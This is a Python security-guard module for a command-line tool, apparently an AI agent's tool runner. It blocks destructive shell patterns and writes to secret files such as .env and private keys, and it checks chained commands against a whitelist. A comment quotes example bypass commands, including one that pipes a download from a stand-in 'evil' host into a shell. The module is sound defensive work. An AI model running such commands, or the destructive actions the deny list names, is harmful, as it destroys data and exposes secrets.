"""Security guard for Neow CLI.

Command whitelist, dangerous patterns and protected files.
"""

import fnmatch
import re
from dataclasses import dataclass
from pathlib import Path
from typing import List, Optional

from neow.utils.logger import logger

SUBSTITUTION_PATTERN = re.compile(r"\$\(|`")


def split_chained_commands(command: str) -> List[str]:
    """Split a shell command into simple commands at top-level ``;``, ``&&``,
    ``||``, ``|``, ``&`` and newlines, respecting quoted strings.

    This is a whitelist-checking aid, not a shell parser: it does not resolve
    variables, globs or subshells. Callers should refuse command substitution
    separately (see ``SUBSTITUTION_PATTERN``), since its contents cannot be
    inspected this way.
    """
    segments: List[str] = []
    current: List[str] = []
    quote: Optional[str] = None
    i, n = 0, len(command)
    while i < n:
        ch = command[i]
        if quote:
            current.append(ch)
            if ch == quote and command[i - 1] != "\\":
                quote = None
            i += 1
            continue
        if ch in ("'", '"'):
            quote = ch
            current.append(ch)
            i += 1
            continue
        if command[i : i + 2] in ("&&", "||"):
            segments.append("".join(current))
            current = []
            i += 2
            continue
        if ch in (";", "|", "&", "\n"):
            segments.append("".join(current))
            current = []
            i += 1
            continue
        current.append(ch)
        i += 1
    segments.append("".join(current))
    return [s.strip() for s in segments if s.strip()]


@dataclass
class SecurityCheck:
    """Result of a security check."""

    allowed: bool
    reason: str


class SecurityGuard:
    """Enforces security policies for tool execution."""

    DANGEROUS_PATTERNS = [
        r"rm\s+(-[a-z]*f|--force|-rf|-rfv)",
        r"git\s+reset\s+--hard",
        r"git\s+push\s+.*(-f|--force)",
        r"drop\s+table",
        r"format\s+[a-z]:",
        r"mkfs\.",
        r"sudo\s+rm",
    ]

    PROTECTED_FILES = [
        ".env",
        ".env.*",
        "id_rsa",
        "id_ed25519",
        "*.pem",
        "*.key",
        "credentials.json",
        "secrets.json",
        ".git/config",
    ]

    def check_command(self, command: str, allowed_commands: List[str]) -> SecurityCheck:
        """Check if a command is allowed.

        Args:
            command: The command string to check.
            allowed_commands: List of allowed command prefixes.

        Returns:
            SecurityCheck with allowed status and reason.
        """
        if self.is_dangerous(command):
            return SecurityCheck(
                allowed=False,
                reason=f"Dangerous command detected: {command}",
            )

        if not allowed_commands:
            return SecurityCheck(allowed=True, reason="")

        # The shell runs the whole string (``shell=True``); checking only the
        # first word lets ``allowed_cmd; rm -rf ~`` or ``$(curl evil|sh)``
        # through. Check every chained segment and refuse substitution, which
        # cannot be inspected this way.
        if SUBSTITUTION_PATTERN.search(command):
            return SecurityCheck(
                allowed=False,
                reason=(
                    "Command substitution ($(...) or `...`) is not allowed "
                    "while an allowed_commands whitelist is configured"
                ),
            )

        for segment in split_chained_commands(command):
            base_cmd = segment.split()[0] if segment.split() else ""
            if base_cmd and base_cmd not in allowed_commands:
                return SecurityCheck(
                    allowed=False,
                    reason=f"Command '{base_cmd}' not in whitelist: {allowed_commands}",
                )

        return SecurityCheck(allowed=True, reason="")

    def check_file_access(self, file_path: str, operation: str) -> SecurityCheck:
        """Check if a file operation is allowed.

        Args:
            file_path: Path to the file.
            operation: Operation type (read, write, edit, delete).

        Returns:
            SecurityCheck with allowed status and reason.
        """
        if operation in ("write", "edit", "delete") and self.is_protected(file_path):
            return SecurityCheck(
                allowed=False,
                reason=f"Protected file: {file_path}",
            )
        return SecurityCheck(allowed=True, reason="")

    def is_dangerous(self, command: str) -> bool:
        """Check if a command matches dangerous patterns.

        Args:
            command: Command string to check.

        Returns:
            True if command matches a dangerous pattern.
        """
        cmd_lower = command.lower()
        for pattern in self.DANGEROUS_PATTERNS:
            if re.search(pattern, cmd_lower):
                logger.warning(f"Dangerous command detected: {command}")
                return True
        return False

    def is_protected(self, file_path: str) -> bool:
        """Check if a file is protected.

        Args:
            file_path: Path to check.

        Returns:
            True if file matches a protected pattern.
        """
        file_name = Path(file_path).name
        for pattern in self.PROTECTED_FILES:
            if fnmatch.fnmatch(file_name, pattern) or fnmatch.fnmatch(
                file_path, pattern
            ):
                logger.warning(f"Protected file access attempt: {file_path}")
                return True
        return False
